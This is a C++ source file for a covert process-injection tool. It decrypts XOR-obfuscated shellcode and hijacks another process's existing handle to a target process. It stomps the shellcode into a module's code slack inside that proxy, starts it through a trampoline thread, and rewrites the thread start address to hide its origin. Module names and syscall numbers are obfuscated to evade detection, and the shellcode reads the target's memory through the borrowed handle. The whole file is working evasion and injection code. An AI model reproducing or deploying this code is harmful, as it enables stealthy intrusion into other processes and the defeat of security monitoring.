#include "proxy.h"
#include "stealth_strings.h"

static constexpr uint8_t SC_KEY = 0xA7;

static const uint8_t SHELLCODE_ENC[] = {
    0x56 ^ SC_KEY, 0x48 ^ SC_KEY, 0x83 ^ SC_KEY, 0xEC ^ SC_KEY, 0x30 ^ SC_KEY,
    0x48 ^ SC_KEY, 0x89 ^ SC_KEY, 0xCE ^ SC_KEY,
    0x8B ^ SC_KEY, 0x46 ^ SC_KEY, 0x10 ^ SC_KEY,
    0x85 ^ SC_KEY, 0xC0 ^ SC_KEY,
    0x74 ^ SC_KEY, 0xF9 ^ SC_KEY,
    0x8B ^ SC_KEY, 0x46 ^ SC_KEY, 0x00 ^ SC_KEY,
    0x33 ^ SC_KEY, 0x46 ^ SC_KEY, 0x04 ^ SC_KEY,
    0x48 ^ SC_KEY, 0x8B ^ SC_KEY, 0x4E ^ SC_KEY, 0x08 ^ SC_KEY,
    0x48 ^ SC_KEY, 0x8B ^ SC_KEY, 0x56 ^ SC_KEY, 0x18 ^ SC_KEY,
    0x4C ^ SC_KEY, 0x8D ^ SC_KEY, 0x46 ^ SC_KEY, 0x28 ^ SC_KEY,
    0x4C ^ SC_KEY, 0x8B ^ SC_KEY, 0x4E ^ SC_KEY, 0x20 ^ SC_KEY,
    0x48 ^ SC_KEY, 0xC7 ^ SC_KEY, 0x44 ^ SC_KEY, 0x24 ^ SC_KEY, 0x28 ^ SC_KEY,
    0x00 ^ SC_KEY, 0x00 ^ SC_KEY, 0x00 ^ SC_KEY, 0x00 ^ SC_KEY,
    0x4C ^ SC_KEY, 0x8B ^ SC_KEY, 0xD1 ^ SC_KEY,
    0x0F ^ SC_KEY, 0x05 ^ SC_KEY,
    0x89 ^ SC_KEY, 0x46 ^ SC_KEY, 0x14 ^ SC_KEY,
    0xC7 ^ SC_KEY, 0x46 ^ SC_KEY, 0x10 ^ SC_KEY, 0x00 ^ SC_KEY, 0x00 ^ SC_KEY,
    0x00 ^ SC_KEY, 0x00 ^ SC_KEY,
    0xEB ^ SC_KEY, 0xC9 ^ SC_KEY,
};

static uint8_t* g_sc_buf = nullptr;
static size_t g_sc_size = 0;

void decrypt_shellcode() {
    g_sc_size = sizeof(SHELLCODE_ENC);
    g_sc_buf = new uint8_t[g_sc_size];
    for (size_t i = 0; i < g_sc_size; i++)
        g_sc_buf[i] = SHELLCODE_ENC[i] ^ SC_KEY;
}

void zero_shellcode() {
    if (g_sc_buf) {
        SecureZeroMemory(g_sc_buf, g_sc_size);
        delete[] g_sc_buf;
        g_sc_buf = nullptr;
    }
}

uint32_t XOR_KEY1;

// ─────────────────────────────────────────────────────────────────────────────
// Module stomping helpers
// ─────────────────────────────────────────────────────────────────────────────

struct ModuleCandidate {
    uint64_t base;
    DWORD    size;
    char     name[256];
};

struct SectionInfo {
    uint32_t rva;
    uint32_t vsize;
    char     name[8];
};

static bool is_blocked_module(const char* name) {
    static const uint8_t B0[] = {0xF2,0xE8,0xF8,0xF0,0xF0,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B1[] = {0xF7,0xF9,0xEE,0xF2,0xF9,0xF0,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B2[] = {0xF7,0xF9,0xEE,0xF2,0xF9,0xF0,0xFE,0xFD,0xEF,0xF9,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B3[] = {0xF1,0xEF,0xEA,0xFF,0xEE,0xE8,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B4[] = {0xEE,0xEC,0xFF,0xEE,0xE8,0xA8,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B5[] = {0xEF,0xF9,0xFF,0xF4,0xF3,0xEF,0xE8,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B6[] = {0xFD,0xF8,0xEA,0xFD,0xEC,0xF5,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B7[] = {0xFF,0xF3,0xF1,0xFE,0xFD,0xEF,0xF9,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B8[] = {0xE9,0xEF,0xF9,0xEE,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B9[] = {0xFB,0xF8,0xF5,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B10[] = {0xF3,0xF0,0xF9,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B11[] = {0xFE,0xFF,0xEE,0xE5,0xEC,0xE8,0xB2,0xF8,0xF0,0xF0};
    static const uint8_t B12[] = {0xFF,0xEE,0xE5,0xEC,0xE8,0xAF,0xAE,0xB2,0xF8,0xF0,0xF0};

    char buf[256];
    static const uint8_t* names[] = {B0,B1,B2,B3,B4,B5,B6,B7,B8,B9,B10,B11,B12};
    static const uint8_t lens[] = {9,12,14,10,10,11,12,11,10,9,9,10,11};
    for (int i = 0; i < _countof(lens); i++) {
        for (size_t j = 0; j < (size_t)lens[i]; j++) buf[j] = names[i][j] ^ 0x9C;
        buf[lens[i]] = '\0';
        if (_stricmp(name, buf) == 0) return true;
    }
    return false;
}

static std::vector<ModuleCandidate> enum_proxy_modules(HANDLE snapshot) {
    std::vector<ModuleCandidate> result;
    MODULEENTRY32 me{};
    me.dwSize = sizeof(me);
    if (Module32First(snapshot, &me)) {
        do {
            if (is_blocked_module(me.szModule)) continue;
            ModuleCandidate mc;
            mc.base = (uint64_t)me.modBaseAddr;
            mc.size = me.modBaseSize;
            strncpy_s(mc.name, me.szModule, _TRUNCATE);
            result.push_back(mc);
        } while (Module32Next(snapshot, &me));
    }
    std::sort(result.begin(), result.end(),
              [](const ModuleCandidate& a, const ModuleCandidate& b) { return a.size < b.size; });
    LOG( "  %zu candidate modules (after blocklist)\n", result.size());
    return result;
}

static std::pair<uint64_t, size_t> find_text_slack(HANDLE proxy_h, uint64_t module_base) {
    uint8_t dos_header[64];
    if (!sys_read(proxy_h, module_base, dos_header, 64)) return {0, 0};
    uint32_t e_lfanew = *(uint32_t*)(dos_header + 0x3C);

    uint8_t coff_header[20];
    if (!sys_read(proxy_h, module_base + e_lfanew + 4, coff_header, 20)) return {0, 0};
    uint16_t num_sections = *(uint16_t*)(coff_header + 2);
    uint16_t size_opt_hdr = *(uint16_t*)(coff_header + 16);

    uint32_t sections_offset = e_lfanew + 4 + 20 + size_opt_hdr;
    size_t sections_data_size = (size_t)num_sections * 40;
    std::vector<uint8_t> sections_data(sections_data_size);
    if (!sys_read(proxy_h, module_base + sections_offset, sections_data.data(), sections_data_size))
        return {0, 0};

    uint32_t text_rva = 0, text_vsize = 0;
    bool found_text = false;
    std::vector<SectionInfo> sections;
    sections.reserve(num_sections);
    for (uint16_t i = 0; i < num_sections; i++) {
        uint8_t* sh = sections_data.data() + i * 40;
        SectionInfo si;
        memcpy(si.name, sh, 8);
        si.vsize = *(uint32_t*)(sh + 8);
        si.rva = *(uint32_t*)(sh + 12);
        sections.push_back(si);
        if (!found_text && memcmp(si.name, ".text", 5) == 0) {
            text_rva = si.rva;
            text_vsize = si.vsize;
            found_text = true;
        }
    }
    if (!found_text) return {0, 0};

    uint32_t text_end = text_rva + text_vsize;
    uint32_t next_start = 0;

    std::sort(sections.begin(), sections.end(),
              [](const SectionInfo& a, const SectionInfo& b) { return a.rva < b.rva; });

    bool found_next = false;
    for (auto& sec : sections) {
        if (sec.rva > text_end) {
            next_start = sec.rva;
            found_next = true;
            break;
        }
    }
    if (!found_next) {
        uint8_t opt_header_buf[64];
        uint32_t opt_offset = e_lfanew + 4 + 20;
        if (!sys_read(proxy_h, module_base + opt_offset, opt_header_buf, 64)) return {0, 0};
        next_start = *(uint32_t*)(opt_header_buf + 56);
    }

    if (next_start <= text_end) return {0, 0};
    size_t slack = (size_t)(next_start - text_end);
    return {module_base + text_end, slack};
}

static bool stomp_shellcode(HANDLE proxy_h, uint64_t addr, const uint8_t* sc, size_t sc_len,
                              std::vector<uint8_t>& out_saved, ULONG& out_saved_prot) {
    ULONG orig_prot = 0;
    if (!sys_protect(proxy_h, addr, sc_len, PAGE_EXECUTE_READWRITE, &orig_prot)) {
        LOG( "  stomp: sys_protect->ERW failed at %p\n", (void*)addr);
        return false;
    }

    out_saved.resize(sc_len);
    if (!sys_read(proxy_h, addr, out_saved.data(), sc_len)) return false;
    if (!sys_write(proxy_h, addr, sc, sc_len)) return false;

    std::vector<uint8_t> verify(sc_len);
    if (!sys_read(proxy_h, addr, verify.data(), sc_len)) return false;
    if (memcmp(verify.data(), sc, sc_len) != 0) {
        LOG( "  stomp: verify mismatch!\n");
        return false;
    }

    out_saved_prot = orig_prot;
    LOG( "  stomp: OK at %p, orig_prot=0x%lx, keeping ERW\n", (void*)addr, (unsigned long)orig_prot);

    FlushInstructionCache(proxy_h, (LPCVOID)addr, sc_len);
    LOG( "  FlushInstructionCache done\n");

    std::vector<uint8_t> post_verify(sc_len);
    if (sys_read(proxy_h, addr, post_verify.data(), sc_len)) {
        if (memcmp(post_verify.data(), sc, sc_len) != 0) {
            LOG( "  stomp: POST-FLUSH verify mismatch!\n");
            return false;
        }
        LOG( "  stomp: POST-FLUSH verify OK\n");
    }

    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// ProxyContext and setup
// ─────────────────────────────────────────────────────────────────────────────

ProxyContext* g_proxy_ctx = nullptr;

void proxy_cleanup(ProxyContext& ctx) {
    static std::atomic<bool> done{false};
    if (done.exchange(true)) return;
    if (!ctx.proxy_handle) return;

    if (ctx.thread_handle) {
        TerminateThread(ctx.thread_handle, 0);
        CloseHandle(ctx.thread_handle);
        ctx.thread_handle = nullptr;
    }

    if (ctx.stomped && ctx.shellcode_addr && !ctx.saved_bytes.empty()) {
        ULONG tmp = 0;
        sys_protect(ctx.proxy_handle, ctx.shellcode_addr, ctx.saved_bytes.size(),
                    PAGE_EXECUTE_READWRITE, &tmp);
        sys_write(ctx.proxy_handle, ctx.shellcode_addr,
                  ctx.saved_bytes.data(), ctx.saved_bytes.size());
        sys_protect(ctx.proxy_handle, ctx.shellcode_addr, ctx.saved_bytes.size(),
                    ctx.saved_prot, &tmp);
    } else if (ctx.shellcode_addr) {
        sys_free(ctx.proxy_handle, ctx.shellcode_addr);
    }

    if (ctx.remote_addr) {
        sys_free(ctx.proxy_handle, ctx.remote_addr);
        ctx.remote_addr = 0;
    }

    if (ctx.trampoline_addr) {
        uint8_t zeros[64] = {};
        sys_write(ctx.proxy_handle, ctx.trampoline_addr, zeros, sizeof(zeros));
        ctx.trampoline_addr = 0;
    }
}

ProxyContext setup_proxy(DWORD target_pid) {
    ULONG buf_size = 4 * 1024 * 1024;
    std::vector<uint8_t> buf;
    NTSTATUS status;

    do {
        buf.resize(buf_size);
        ULONG ret = 0;
        status = ((fn_NtQuerySystemInformation)g_sys.NtQuerySystemInformation.code)(
            16, buf.data(), buf_size, &ret);
        if (status == (NTSTATUS)0xC0000004L) buf_size *= 2;
    } while (status == (NTSTATUS)0xC0000004L);

    if (status != 0) {
        LOG( "NtQuerySystemInformation failed: 0x%08lx\n", (unsigned long)(status & 0xFFFFFFFF));
        exit(1);
    }

    auto* info = (SYSTEM_HANDLE_INFORMATION*)buf.data();
    LOG( "Scanning %lu system handles...\n", (unsigned long)info->Count);

    const ULONG NEEDED = PROCESS_VM_READ;
    DWORD  proxy_pid = 0;
    USHORT proxy_handle_value = 0;

    for (int attempt = 0; attempt < 30 && !proxy_pid; attempt++) {
        if (attempt > 0) {
            LOG( "Waiting for proxy handle... (%d/30, ~1s each)\n", attempt + 1);
            Sleep(1000);

            buf_size = 4 * 1024 * 1024;
            do {
                buf.resize(buf_size);
                ULONG ret = 0;
                status = ((fn_NtQuerySystemInformation)g_sys.NtQuerySystemInformation.code)(
                    16, buf.data(), buf_size, &ret);
                if (status == (NTSTATUS)0xC0000004L) buf_size *= 2;
            } while (status == (NTSTATUS)0xC0000004L);
            if (status != 0) continue;
            info = (SYSTEM_HANDLE_INFORMATION*)buf.data();
            LOG( "Scanning %lu handles...\n", (unsigned long)info->Count);
        }

        for (ULONG i = 0; i < info->Count; i++) {
            auto& e = info->Handles[i];
            if (e.UniqueProcessId == GetCurrentProcessId()) continue;
            if (e.UniqueProcessId == (USHORT)target_pid) continue;
            if ((e.GrantedAccess & NEEDED) != NEEDED) continue;

            HANDLE owner = sys_open(e.UniqueProcessId, PROCESS_DUP_HANDLE);
            if (!owner) continue;

            HANDLE duped = nullptr;
            auto ds = ((fn_NtDuplicateObject)g_sys.NtDuplicateObject.code)(
                owner, (HANDLE)(uintptr_t)e.HandleValue,
                GetCurrentProcess(), &duped, 0, 0, 0x00000002);
            sys_close(owner);

            if (ds != 0 || !duped) continue;

            DWORD hpid = GetProcessId(duped);
            sys_close(duped);

            if (hpid == target_pid) {
                proxy_pid = e.UniqueProcessId;
                proxy_handle_value = e.HandleValue;
                LOG( "Found: pid %u holds handle 0x%x (access 0x%lx)\n",
                        proxy_pid, proxy_handle_value, (unsigned long)e.GrantedAccess);
                break;
            }
        }
    }

    if (!proxy_pid) {
        LOG( "No proxy process found\n");
        exit(1);
    }

    HANDLE proxy_h = sys_open(proxy_pid,
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD);
    if (!proxy_h) {
        LOG( "Cannot open proxy process %u\n", proxy_pid);
        exit(1);
    }

    void* remote = nullptr;
    SIZE_T data_size = sizeof(ProxyData);
    status = ((fn_NtAllocateVirtualMemory)g_sys.NtAllocateVirtualMemory.code)(
        proxy_h, &remote, 0, &data_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0 || !remote) {
        LOG( "NtAllocateVirtualMemory failed: 0x%08lx\n",
                (unsigned long)(status & 0xFFFFFFFF));
        exit(1);
    }
    LOG( "Allocated %zu bytes ProxyData in proxy at %p (PAGE_READWRITE)\n",
            data_size, remote);

    ProxyData pd{};
    pd.syscall_num  = g_sys.NtReadVirtualMemory.number ^ XOR_KEY1;
    pd.xor_key      = XOR_KEY1;
    pd.handle_value = (uint64_t)(uintptr_t)proxy_handle_value;
    pd.signal       = 0;

    if (!sys_write(proxy_h, (uint64_t)remote, &pd, sizeof(pd))) {
        LOG( "Failed to write ProxyData\n"); exit(1);
    }
    SecureZeroMemory(&pd, sizeof(pd));
    XOR_KEY1 = 0;

    size_t sc_size = g_sc_size;
    uint64_t shellcode_addr = 0;
    bool stomped = false;
    std::vector<uint8_t> saved_bytes;
    ULONG saved_prot = 0;

    HANDLE mod_snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, proxy_pid);
    if (mod_snap == INVALID_HANDLE_VALUE) {
        LOG( "Module snapshot failed for pid %u\n", proxy_pid);
        exit(1);
    }
    auto candidates = enum_proxy_modules(mod_snap);
    CloseHandle(mod_snap);

    if (candidates.empty()) {
        LOG( "No viable modules for stomping (all blocklisted?)\n");
        exit(1);
    }

    for (auto& mod : candidates) {
        auto slack_result = find_text_slack(proxy_h, mod.base);
        uint64_t slack_addr = slack_result.first;
        size_t slack_len = slack_result.second;
        if (slack_addr == 0 || slack_len < sc_size) continue;

        LOG( "  Trying %s: slack=%zu at %p\n", mod.name, slack_len, (void*)slack_addr);
        if (stomp_shellcode(proxy_h, slack_addr, g_sc_buf, sc_size,
                            saved_bytes, saved_prot)) {
            shellcode_addr = slack_addr;
            stomped = true;
            break;
        }
    }

    if (!shellcode_addr) {
        LOG( "No suitable module found for stomping\n");
        exit(1);
    }

    zero_shellcode();

    uint64_t trampoline_addr = 0;
    {
        void* tramp_mem = nullptr;
        SIZE_T tramp_size = 4096;
        status = ((fn_NtAllocateVirtualMemory)g_sys.NtAllocateVirtualMemory.code)(
            proxy_h, &tramp_mem, 0, &tramp_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (status != 0 || !tramp_mem) {
            LOG( "  Trampoline alloc failed: 0x%08lx\n", (unsigned long)(status & 0xFFFFFFFF));
            exit(1);
        }
        trampoline_addr = (uint64_t)tramp_mem;
        LOG( "  Trampoline allocated at %p (MEM_PRIVATE, ERW)\n", tramp_mem);

        uint8_t tramp[22];
        tramp[0] = 0x48; tramp[1] = 0xB9;
        memcpy(tramp + 2, &remote, 8);
        tramp[10] = 0x48; tramp[11] = 0xB8;
        memcpy(tramp + 12, &shellcode_addr, 8);
        tramp[20] = 0xFF; tramp[21] = 0xE0;

        if (!sys_write(proxy_h, trampoline_addr, tramp, sizeof(tramp))) {
            LOG( "  Trampoline write failed\n"); exit(1);
        }

        uint8_t verify[22];
        if (!sys_read(proxy_h, trampoline_addr, verify, sizeof(verify)) ||
            memcmp(verify, tramp, sizeof(verify)) != 0) {
            LOG( "  Trampoline verify failed\n"); exit(1);
        }
        LOG( "  Trampoline written OK: mov rcx,%p; jmp %p\n", remote, (void*)shellcode_addr);
    }

    HANDLE thread = nullptr;
    LOG( "Creating thread: start=%p (trampoline) arg=%p\n",
            (void*)trampoline_addr, remote);
    status = ((fn_NtCreateThreadEx)g_sys.NtCreateThreadEx.code)(
        &thread, THREAD_ALL_ACCESS, nullptr, proxy_h,
        (void*)trampoline_addr, remote,
        0, 0, 0, 0, nullptr);
    if (status != 0) {
        LOG( "NtCreateThreadEx failed: 0x%08lx\n",
                (unsigned long)(status & 0xFFFFFFFF));
        exit(1);
    }
    LOG( "PROXY MODE — shellcode stomped at %p, thread entry via trampoline at %p\n",
            (void*)shellcode_addr, (void*)trampoline_addr);

    Sleep(500);

    ProxyData pd_check{};
    sys_read(proxy_h, (uint64_t)remote, &pd_check, sizeof(pd_check));
    LOG( "  ProxyData after 500ms: syscall=%u handle=0x%llx signal=%d status=0x%08X target=0x%llx size=%llu\n",
            pd_check.syscall_num, (unsigned long long)pd_check.handle_value,
            pd_check.signal, (unsigned)pd_check.status,
            (unsigned long long)pd_check.target_addr, (unsigned long long)pd_check.size);

    if (pd_check.status == 0) {
        LOG( "  Status: STATUS_SUCCESS — shellcode likely running\n");
    } else if (pd_check.status != 0) {
        LOG( "  Status: 0x%08X\n", (unsigned)pd_check.status);
    }

#ifdef VERBOSE
    uint8_t sc_check[32];
    if (sys_read(proxy_h, shellcode_addr, sc_check, 32)) {
        LOG( "  Shellcode bytes at %p:", (void*)shellcode_addr);
        for (int i = 0; i < 32; i++) LOG( " %02X", sc_check[i]);
        LOG( "\n");
    }
#endif

    DWORD exit_code = 0;
    GetExitCodeThread(thread, &exit_code);
    if (exit_code == STILL_ACTIVE) {
        LOG( "  Thread still ACTIVE\n");
    } else {
        LOG( "  Thread EXITED with code %lu (0x%lX)\n", (unsigned long)exit_code, (unsigned long)exit_code);
        if (exit_code == 0xC0000602)
            LOG( "  *** CFG violation ***\n");
        else if (exit_code == 0xC0000005)
            LOG( "  *** ACCESS_VIOLATION ***\n");
    }

    if (exit_code == STILL_ACTIVE && pd_check.signal == 0 && pd_check.status == 0) {
        LOG( "  Shellcode appears alive (signal consumed, status=0)\n");
    } else if (exit_code == STILL_ACTIVE && pd_check.signal != 0) {
#ifdef VERBOSE
        LOG( "\n  === DIAGNOSTIC: Thread alive but shellcode not responding ===\n");
        SuspendThread(thread);
        CONTEXT ctx2{};
        ctx2.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(thread, &ctx2)) {
            LOG( "    RIP=0x%llx  RCX=0x%llx  RDX=0x%llx\n",
                    (unsigned long long)ctx2.Rip,
                    (unsigned long long)ctx2.Rcx,
                    (unsigned long long)ctx2.Rdx);
            LOG( "    RSP=0x%llx  RSI=0x%llx\n",
                    (unsigned long long)ctx2.Rsp,
                    (unsigned long long)ctx2.Rsi);
        }
        ResumeThread(thread);
#endif
    }

    if (exit_code != STILL_ACTIVE) {
        LOG( "Shellcode not responding — CFG likely blocked execution\n");
        CloseHandle(thread);
        if (stomped && shellcode_addr) {
            ULONG tmp = 0;
            sys_protect(proxy_h, shellcode_addr, saved_bytes.size(), PAGE_EXECUTE_READWRITE, &tmp);
            sys_write(proxy_h, shellcode_addr, saved_bytes.data(), saved_bytes.size());
            sys_protect(proxy_h, shellcode_addr, saved_bytes.size(), saved_prot, &tmp);
        }
        exit(1);
    }

    {
        uint8_t zeros[64] = {};
        sys_write(proxy_h, trampoline_addr, zeros, 64);
        ULONG tmp = 0;
        sys_protect(proxy_h, trampoline_addr, 4096, PAGE_READWRITE, &tmp);
        uint8_t ret_byte = 0xC3;
        sys_write(proxy_h, trampoline_addr, &ret_byte, 1);
        LOG( "  Trampoline deexecuted (PAGE_READWRITE + ret)\n");

        {
            ULONG_PTR new_start = (ULONG_PTR)shellcode_addr;
            bool start_addr_fixed = false;
            NTSTATUS si9 = ((fn_NtSetInformationThread)g_sys.NtSetInformationThread.code)(
                thread, 9, &new_start, sizeof(new_start));
            if (si9 == 0) {
                LOG( "  Thread start addr rewritten to %p\n", (void*)shellcode_addr);
                start_addr_fixed = true;
            } else {
                NTSTATUS siA = ((fn_NtSetInformationThread)g_sys.NtSetInformationThread.code)(
                    thread, 0x0A, &new_start, sizeof(new_start));
                if (siA == 0) {
                    LOG( "  Thread start addr rewritten (0x0A) to %p\n", (void*)shellcode_addr);
                    start_addr_fixed = true;
                }
            }
            if (!start_addr_fixed) {
                LOG( "  Thread start addr remains at trampoline\n");
            }
        }

        if (stomped && saved_prot != PAGE_EXECUTE_READWRITE) {
            ULONG dummy = 0;
            if (sys_protect(proxy_h, shellcode_addr, saved_bytes.size(), saved_prot, &dummy)) {
                LOG( "  Stomped page protection restored to 0x%lx\n", (unsigned long)saved_prot);
            } else {
                LOG( "  Stomped page protection restore FAILED\n");
            }
        }
    }

    Sleep(500);
    {
        ProxyData pd_smoke{};
        sys_read(proxy_h, (uint64_t)remote, &pd_smoke, sizeof(pd_smoke));
        if (pd_smoke.signal != 0) {
            LOG( "  Smoke test: signal not consumed, shellcode not running\n");
            TerminateThread(thread, 0);
            CloseHandle(thread);
            exit(1);
        }
    }

    return { proxy_h, (uint64_t)remote, shellcode_addr, trampoline_addr, thread, stomped, std::move(saved_bytes), saved_prot };
}

